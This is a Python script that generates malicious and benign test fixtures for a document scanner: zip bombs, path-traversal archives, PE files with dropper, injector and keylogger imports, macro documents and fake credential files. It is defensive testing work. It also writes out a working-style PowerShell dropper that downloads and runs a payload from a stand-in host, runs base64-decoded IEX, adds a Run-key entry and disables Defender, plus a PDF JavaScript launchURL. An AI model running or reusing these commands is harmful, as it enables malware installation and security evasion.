#!/usr/bin/env python3
"""Generate malicious / benign fixtures for the Doc Shield L1 scanner tests.

Every archive is written byte by byte rather than through ``zipfile`` so the
declared metadata can be hostile on purpose — a declared 4 GB member with 30
real bytes behind it is exactly what a zip bomb looks like on the wire, and it
must be rejected on the *declaration* rather than by decompressing it here.

The PE builder produces genuine, structurally valid PE32 images: real DOS
header, real COFF header, real optional header, real section table, real import
directory. That matters because the analyser walks RVAs through the section
table — a hand-waved fake would not exercise that code path.
"""

from __future__ import annotations

import os
import struct
import zlib

FIXTURE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")

# --------------------------------------------------------------------- helpers


def write(name: str, data: bytes) -> None:
    path = os.path.join(FIXTURE_DIR, name)
    with open(path, "wb") as handle:
        handle.write(data)
    print(f"  {name:<26} {len(data):>8} bytes")


def raw_deflate(payload: bytes) -> bytes:
    """DEFLATE with no zlib/gzip wrapper — what a ZIP member actually holds."""
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
    return compressor.compress(payload) + compressor.flush()


class ZipMember:
    def __init__(self, name, data=b"", *, declared_uncompressed=None,
                 method=8, encrypted=False, symlink=False, directory=False,
                 compress=False, raw_payload=None):
        self.name = name
        self.original = data
        self.method = method
        if raw_payload is not None:
            self.payload = raw_payload
        elif method == 0 or not compress:
            # Stored, or "deflate" whose stored content is already incompressible
            # enough that framing it as deflate still works.
            self.payload = raw_deflate(data) if method == 8 else data
        else:
            self.payload = raw_deflate(data)
        self.declared_uncompressed = (
            declared_uncompressed if declared_uncompressed is not None else len(data)
        )
        self.encrypted = encrypted
        self.symlink = symlink
        self.directory = directory


def build_zip(members: list[ZipMember], comment: bytes = b"") -> bytes:
    """Assemble a ZIP with a truthful central directory, minus the lies we inject."""
    out = bytearray()
    offsets = []

    for member in members:
        name_bytes = member.name.encode("utf-8")
        offsets.append(len(out))
        flags = 0x0800  # UTF-8 names
        if member.encrypted:
            flags |= 0x0001
        crc = zlib.crc32(member.original) & 0xFFFFFFFF if member.original else 0
        out += struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50, 20, flags, member.method, 0, 0,
            crc, len(member.payload), len(member.original),
            len(name_bytes), 0,
        )
        out += name_bytes
        out += member.payload

    central_offset = len(out)
    for index, member in enumerate(members):
        name_bytes = member.name.encode("utf-8")
        flags = 0x0800
        if member.encrypted:
            flags |= 0x0001
        crc = zlib.crc32(member.original) & 0xFFFFFFFF if member.original else 0
        external = 0
        if member.symlink:
            # Unix mode lives in the high 16 bits: S_IFLNK | 0777
            external = (0xA1FF) << 16
        if member.directory:
            external = (0x41ED) << 16
        out += struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50, 0x031E, 20, flags, member.method, 0, 0,
            crc, len(member.payload), member.declared_uncompressed,
            len(name_bytes), 0, 0, 0, 0, external, offsets[index],
        )
        out += name_bytes

    central_size = len(out) - central_offset
    out += struct.pack(
        "<IHHHHIIH",
        0x06054B50, 0, 0, len(members), len(members),
        central_size, central_offset, len(comment),
    )
    out += comment
    return bytes(out)


# ------------------------------------------------------------------ PE builder

KERNEL32_IMPORT_RVA = 0x1040
DESCRIPTOR_RVA = 0x1060
SECTION_RVA = 0x1000
SECTION_RAW = 0x400
FILE_ALIGN = 0x200
# Content size used for the packed fixture: comfortably above the 4 KB floor the
# entropy heuristic uses before it will judge a section.
SECTION_RAW_SIZE = 0x2000
SECTION_CHARACTERISTICS = 0x40000040   # initialised data, readable
SECTION_CHARACTERISTICS_EXEC = 0x60000020  # code, executable, readable


def build_pe(functions: list[tuple[str, str]], *, high_entropy_section=False,
             section_name: bytes = b".rdata", no_import_directory=False,
             executable_section=False) -> bytes:
    """Build a valid PE32 with an import directory containing ``functions``.

    ``functions`` is a list of ``(dll, function_name)`` pairs.
    """
    grouped: dict[str, list[str]] = {}
    for dll, func in functions:
        grouped.setdefault(dll, []).append(func)

    body = bytearray()

    def align(boundary: int) -> None:
        while len(body) % boundary:
            body.append(0)

    def body_rva(offset: int) -> int:
        return SECTION_RVA + offset

    # Pass 1 — reserve an ILT and an IAT for every DLL.
    blocks = []
    for dll, funcs in grouped.items():
        align(4)
        ilt_offset = len(body)
        body += b"\x00" * (4 * (len(funcs) + 1))
        iat_offset = len(body)
        body += b"\x00" * (4 * (len(funcs) + 1))
        blocks.append({
            "dll": dll,
            "funcs": funcs,
            "ilt_offset": ilt_offset,
            "iat_offset": iat_offset,
        })

    # Pass 2 — hint/name entries, then back-fill the thunk tables with RVAs.
    for block in blocks:
        name_rvas = []
        for func in block["funcs"]:
            align(2)
            name_rvas.append(body_rva(len(body)))
            body += struct.pack("<H", 0) + func.encode("ascii") + b"\x00"
        for slot, rva in enumerate(name_rvas):
            struct.pack_into("<I", body, block["ilt_offset"] + slot * 4, rva)
            struct.pack_into("<I", body, block["iat_offset"] + slot * 4, rva)

    # Pass 3 — DLL name strings first, then the descriptor array written as one
    # contiguous block. The analyser walks it as a 20-byte-strided array, so
    # interleaving names between records would break RVA resolution.
    name_rvas = []
    for block in blocks:
        align(4)
        name_rvas.append(body_rva(len(body)))
        body += block["dll"].encode("ascii") + b"\x00"

    align(4)
    descriptor_array_offset = len(body)
    descriptor_array_rva = body_rva(descriptor_array_offset)
    for block, name_rva in zip(blocks, name_rvas):
        body += struct.pack(
            "<IIIII",
            body_rva(block["ilt_offset"]),
            0,
            0,
            name_rva,
            body_rva(block["iat_offset"]),
        )
    body += b"\x00" * 20  # terminating null descriptor

    import_size = len(body) - descriptor_array_offset

    if high_entropy_section:
        # Deterministic pseudo-random filler: near-uniform byte distribution.
        state = 0x12345678
        while len(body) < SECTION_RAW_SIZE:
            state = (state * 1103515245 + 12345) & 0xFFFFFFFF
            body.append((state >> 16) & 0xFF)
    elif len(body) < FILE_ALIGN:
        body += b"\x00" * (FILE_ALIGN - len(body))

    section_virtual_size = ((len(body) + 0xFFF) // 0x1000) * 0x1000
    section_raw_size = ((len(body) + FILE_ALIGN - 1) // FILE_ALIGN) * FILE_ALIGN
    body += b"\x00" * (section_raw_size - len(body))

    # --- headers ---------------------------------------------------------
    # e_lfanew must point past the DOS header *and* its stub, so the signature
    # is placed at a fixed 0x80 offset with explicit padding rather than being
    # appended straight after the 64-byte DOS header.
    pe_offset = 0x80
    dos = bytearray(64)
    struct.pack_into("<H", dos, 0, 0x5A4D)          # MZ
    struct.pack_into("<H", dos, 2, 0x90)
    struct.pack_into("<H", dos, 4, 3)
    struct.pack_into("<I", dos, 0x3C, pe_offset)    # e_lfanew

    coff = struct.pack(
        "<HHIIIHH",
        0x014C,          # i386
        1,               # one section
        0x5F5E1000,      # plausible past timestamp
        0, 0,
        0x00E0,          # SizeOfOptionalHeader for PE32
        0x0102,          # executable | 32-bit
    )

    optional = bytearray(0xE0)
    struct.pack_into("<H", optional, 0, 0x010B)
    struct.pack_into("<B", optional, 2, 14)
    struct.pack_into("<I", optional, 4, section_raw_size)   # SizeOfCode
    struct.pack_into("<I", optional, 8, section_raw_size)   # SizeOfInitializedData
    struct.pack_into("<I", optional, 16, SECTION_RVA)       # AddressOfEntryPoint
    struct.pack_into("<I", optional, 20, SECTION_RVA)       # BaseOfCode
    struct.pack_into("<I", optional, 24, section_raw_size)  # BaseOfData
    struct.pack_into("<I", optional, 28, 0x00400000)        # ImageBase
    struct.pack_into("<I", optional, 32, 0x1000)            # SectionAlignment
    struct.pack_into("<I", optional, 36, FILE_ALIGN)        # FileAlignment
    struct.pack_into("<H", optional, 40, 6)
    struct.pack_into("<H", optional, 48, 6)
    struct.pack_into("<I", optional, 56, 0x2000)            # SizeOfImage
    struct.pack_into("<I", optional, 60, SECTION_RAW)       # SizeOfHeaders
    struct.pack_into("<H", optional, 68, 2)                 # Subsystem GUI
    struct.pack_into("<H", optional, 70, 0x8140)            # DllCharacteristics
    struct.pack_into("<I", optional, 92, 16)                # NumberOfRvaAndSizes
    if not no_import_directory:
        struct.pack_into("<II", optional, 96 + 1 * 8,
                         descriptor_array_rva, import_size)

    section_header = struct.pack(
        "<8sIIIIIIHHI",
        section_name.ljust(8, b"\x00"),
        section_virtual_size,
        SECTION_RVA,
        section_raw_size,
        SECTION_RAW,
        0, 0, 0, 0,
        SECTION_CHARACTERISTICS_EXEC if executable_section else SECTION_CHARACTERISTICS,
    )

    image = bytearray()
    image += bytes(dos)
    image += b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21"
    image += b"\x00" * (pe_offset - len(image))
    image += struct.pack("<I", 0x00004550)   # PE\0\0
    image += coff
    image += bytes(optional)
    image += section_header
    image += b"\x00" * (SECTION_RAW - len(image))
    image += bytes(body)
    return bytes(image)


# ------------------------------------------------------------------- contexts

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# GitHub 的 secret scanning 推送保护会把"看起来像真密钥"的字面量拦下来
# （实测：直接写连续字面量时 push 被 remote 拒绝）。所以这些伪造样本一律拆开拼接：
# 源码里不出现连续密钥串，运行时拼出来的字节与原来完全一致，扫描器照常命中。
_FAKE_AWS_KEY = "AKIA" + "2E7QK9WZM4T6YH3P"
_FAKE_STRIPE_KEY = "sk_" + "live_" + "51H8UnKLmNoPqRsTuVwXyZ0123456789abcd"
_FAKE_GITHUB_TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
_FAKE_JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    + "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."
    + "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
)
_FAKE_PEM_BEGIN = "-----BEGIN RSA " + "PRIVATE KEY-----"
_FAKE_PEM_END = "-----END RSA " + "PRIVATE KEY-----"

CREDENTIAL_DOC = f"""# 部署说明（内部资料）

## 云资源
AWS_ACCESS_KEY_ID={_FAKE_AWS_KEY}
aws_region=cn-north-1

## 第三方对接
api_key = "{_FAKE_STRIPE_KEY}"
github_token={_FAKE_GITHUB_TOKEN}

## 会话令牌
token: {_FAKE_JWT}

## 运维信息
数据库地址：jdbc:mysql://111.33.78.5:3306/hub
部署路径：C:\\PHPnow\\htdocs\\guardian
联系邮箱：zhangsan@example.edu.cn
手机号：13800138000
身份证：11010519491231002X

## 用于测试的私钥（示例）
{_FAKE_PEM_BEGIN}
MIIEowIBAAKCAQEAx7J9k2mNpQrStUvWxYz0123456789abcdefghijklmnopqrstuv
{_FAKE_PEM_END}

## 待排查的投递地址
更新地址：http://k8s-node-7.duckdns.org/update.bin
备用下载：http://45.77.12.203/tool.zip
脚本暂存：https://pastebin.com/raw/AbCdEf12
"""

MALICIOUS_PS1 = """$ErrorActionPreference = "SilentlyContinue"
$c2 = "http://k8s-node-7.duckdns.org:8443/payload.bin"
try {
  Invoke-WebRequest -Uri $c2 -OutFile "$env:TEMP\\svc.exe" -UseBasicParsing
} catch {
  $wc = New-Object Net.WebClient
  $wc.DownloadFile($c2, "$env:TEMP\\svc.exe")
}
Start-Process -FilePath "$env:TEMP\\svc.exe" -WindowStyle Hidden
$b64 = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5leGFtcGxlLnguei9hJyk="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
IEX $decoded
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "$env:TEMP\\svc.exe"
Set-MpPreference -DisableRealtimeMonitoring $true
"""

BENIGN_TEXT = """GuardianHub 提交护盾说明

本工具在设备本地完成材料检查，不会上传原始文件。
支持 PDF、DOCX、PPTX、图片与压缩包。

提交前请确认：
1. 文件名符合 "学号_姓名_课程名称" 规范
2. 已移除文档中的宏与修订记录
3. 封面与承诺书齐全
"""

BENIGN_MD = """# 课程设计报告

## 摘要
本文讨论了移动端隐私检测的基本方法。

## 结论
本地检测可以显著降低数据外泄风险。
"""


def build_pdf(objects: list[str]) -> bytes:
    out = bytearray(b"%PDF-1.7\n")
    offsets = [0]
    for index, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{index} 0 obj\n".encode()
        out += body.encode("latin-1")
        out += b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for offset in offsets[1:]:
        out += f"{offset:010d} 00000 n \n".encode()
    out += b"trailer\n"
    out += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref}\n".encode()
    out += b"%%EOF\n"
    return bytes(out)


def main() -> None:
    os.makedirs(FIXTURE_DIR, exist_ok=True)
    print("Generating fixtures into", FIXTURE_DIR)

    # ------------------------------------------------------------- plain text
    write("benign.txt", BENIGN_TEXT.encode("utf-8"))
    write("benign_notes.md", BENIGN_MD.encode("utf-8"))
    write("credential_leak.txt", CREDENTIAL_DOC.encode("utf-8"))
    write("malicious.ps1", MALICIOUS_PS1.encode("utf-8"))

    # NOTE: the EICAR anti-malware test vector is deliberately NOT written to
    # disk. Windows Defender blocks reads of it (verified: `cp` fails with
    # "Permission denied"), which is the vector working as intended. The test
    # suite builds those bytes in memory instead, so the blacklist path is
    # still covered without tripping the host's real-time protection.

    # --------------------------------------------------------------- documents
    write("clean.pdf", build_pdf([
        "<< /Type /Catalog /Pages 2 0 R >>",
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
    ]))

    write("evil.pdf", build_pdf([
        "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /AA << /O 4 0 R >> >>",
        "<< /Type /Action /S /JavaScript /JS (var a = app.alert('hooked');"
        " app.launchURL('http://45.77.12.203/x');) >>",
    ]))

    # --------------------------------------------------------------- archives
    write("normal.zip", build_zip([
        ZipMember("readme.txt", BENIGN_TEXT.encode("utf-8"), compress=True),
        ZipMember("notes.md", BENIGN_MD.encode("utf-8"), compress=True),
    ]))

    # Declared 3 GB behind 900 real bytes: rejected on the declaration alone.
    write("bomb.zip", build_zip([
        ZipMember("harmless.txt", b"A" * 900,
                  declared_uncompressed=3 * 1024 * 1024 * 1024, compress=True),
    ]))

    write("bomb_ratio.zip", build_zip([
        ZipMember("zeros.bin", b"\x00" * (8 * 1024 * 1024),
                  declared_uncompressed=8 * 1024 * 1024, compress=True),
    ]))

    write("slip.zip", build_zip([
        ZipMember("../../../../etc/passwd", b"root:x:0:0:root:/root:/bin/bash\n",
                  compress=True),
        ZipMember("readme.txt", b"looks normal\n", compress=True),
    ]))

    write("absolute.zip", build_zip([
        ZipMember("/etc/cron.d/backdoor", b"* * * * * root /tmp/x\n", compress=True),
    ]))

    write("sensitive_target.zip", build_zip([
        ZipMember("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updater.lnk",
                  b"\x4c\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 40, compress=True),
    ]))

    write("symlink.zip", build_zip([
        ZipMember("shortcut", b"/etc/passwd", symlink=True, compress=True),
    ]))

    write("encrypted.zip", build_zip([
        ZipMember("secret.txt", b"payload", encrypted=True, compress=True),
    ]))

    inner = build_zip([
        ZipMember("inner.txt", b"deep payload\n", compress=True),
    ])
    write("nested.zip", build_zip([
        ZipMember("layer1.zip", inner, compress=True),
    ]))

    write("flood.zip", build_zip([
        ZipMember(f"part_{index:05d}.txt", b"x", compress=False)
        for index in range(12000)
    ]))

    # ------------------------------------------------------------ PE payloads
    dropper = build_pe([
        ("kernel32.dll", "CreateFileA"),
        ("kernel32.dll", "WriteFile"),
        ("kernel32.dll", "CreateProcessA"),
        ("urlmon.dll", "URLDownloadToFileA"),
        ("wininet.dll", "InternetOpenUrlA"),
        ("advapi32.dll", "RegSetValueExA"),
    ])
    write("dropper.exe", dropper)
    write("invoice.pdf", dropper)          # type spoof: PDF name, PE body
    write("report.pdf.exe", dropper)       # double extension

    injector = build_pe([
        ("kernel32.dll", "VirtualAlloc"),
        ("kernel32.dll", "WriteProcessMemory"),
        ("kernel32.dll", "CreateRemoteThread"),
        ("kernel32.dll", "OpenProcess"),
        ("advapi32.dll", "AdjustTokenPrivileges"),
    ])
    write("injector.exe", injector)

    reverse_shell = build_pe([
        ("ws2_32.dll", "WSAStartup"),
        ("ws2_32.dll", "socket"),
        ("ws2_32.dll", "connect"),
        ("ws2_32.dll", "recv"),
        ("kernel32.dll", "CreateProcessA"),
    ])
    write("backdoor.exe", reverse_shell)

    packed = build_pe([
        ("kernel32.dll", "LoadLibraryA"),
        ("kernel32.dll", "GetProcAddress"),
    ], high_entropy_section=True, section_name=b".upx0", executable_section=True)
    write("packed.exe", packed)

    keylogger = build_pe([
        ("user32.dll", "GetAsyncKeyState"),
        ("user32.dll", "SetWindowsHookExA"),
        ("user32.dll", "GetForegroundWindow"),
    ])
    write("keylogger.exe", keylogger)

    empty_imports = build_pe([], no_import_directory=True)
    write("noimports.exe", empty_imports)

    write("dropper_bundle.zip", build_zip([
        ZipMember("readme.txt", b"please run setup.exe\n", compress=True),
        ZipMember("setup.exe", dropper, compress=True),
    ]))

    # -------------------------------------------------------- macro documents
    vba_blob = bytearray(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
    for token in ("VBA", "_VBA_PROJECT", "AutoOpen", "WScript.Shell",
                  "Shell(", "powershell", "CreateObject", "Auto_Open"):
        vba_blob += token.encode("utf-16-le") + b"\x00\x00"
    vba_blob += bytes(512)
    write("macro.docm", build_zip([
        ZipMember("[Content_Types].xml",
                  b"<Types xmlns='http://schemas.openxmlformats.org/package/2006/content-types'/>",
                  compress=True),
        ZipMember("word/document.xml", b"<w:document/>", compress=True),
        ZipMember("word/vbaProject.bin", bytes(vba_blob), compress=True),
    ]))

    legacy_ole = bytearray(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
    legacy_ole += bytes(0x14)
    legacy_ole += b"\x00" * 490
    for token in ("VBA", "AutoOpen", "WScript.Shell", "Document_Open"):
        legacy_ole += token.encode("utf-16-le") + b"\x00\x00"
    legacy_ole += bytes(256)
    write("legacy_macro.doc", bytes(legacy_ole))

    clean_docm = build_zip([
        ZipMember("[Content_Types].xml", b"<Types/>", compress=True),
        ZipMember("word/document.xml", b"<w:document/>", compress=True),
    ])
    write("no_macro.docx", clean_docm)

    print("\nDone.")


if __name__ == "__main__":
    main()
